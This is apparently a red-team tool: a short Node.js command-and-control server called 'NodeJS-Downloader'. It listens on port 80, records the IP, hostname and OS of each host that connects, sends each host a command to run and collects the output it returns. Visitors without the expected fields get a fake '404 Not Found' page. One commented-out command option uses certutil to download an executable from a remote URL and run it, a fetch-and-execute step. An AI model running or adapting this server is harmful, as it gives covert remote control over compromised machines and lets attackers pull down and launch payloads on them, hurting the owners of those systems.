function getClientIp(req) {
	return req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
};
console.log('NodeJS-Downloader');
console.log('An example of a downloader written in NodeJS.');
console.log('Author:3gstudent');

//change this
var command = 'whoami';
//var command = 'taskkill /f /im node.exe';
//var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';
console.log('[>]Global Command:',command);

var postErrorHTML =
    '<html><head><meta charset="utf-8"><title>Node.js test</title></head>' +
    '<body>' +
    '404 Not Found' +
    '</body></html>';
 
var http = require('http');
var querystring = require('querystring');
var i = +'0'; 


http.createServer(function (req, res) {
	console.log('-----------------------------------------------------');
	i = i+1;
	console.log(i);
    	var body = '';
	var myDate = new Date();
	var mytime=myDate.toLocaleString();

	console.log('[+]New host');
	console.log('[*]Time:',mytime);
    	console.log('[*]IP:',getClientIp(req));
    
    	req.on('data', function (chunk) {
		body += chunk;
    	});
 
    	req.on('end', function () {
        	body = querystring.parse(body);  
		if(body.os && body.hostname) { 
            		console.log('[*]Hostname:',body['hostname']);
			console.log('[*]OS:',body['os']);
			console.log('[+]send commands to host:',command);
        		res.write(command);
 		} else if(body.hostname && body.command && body.data)  {       	
            		console.log('[*]Hostname:',body['hostname']);
			console.log('[+]result of the command:',body['command']);
			console.log('*****************************************************');
			console.log(body['data']);
			console.log('*****************************************************');			
			res.write('ok');

		} else {
     			console.log('[!]bad request');       		
			res.write(postErrorHTML);     			
        	}

        	res.end();
    	});
}).listen(80,'0.0.0.0');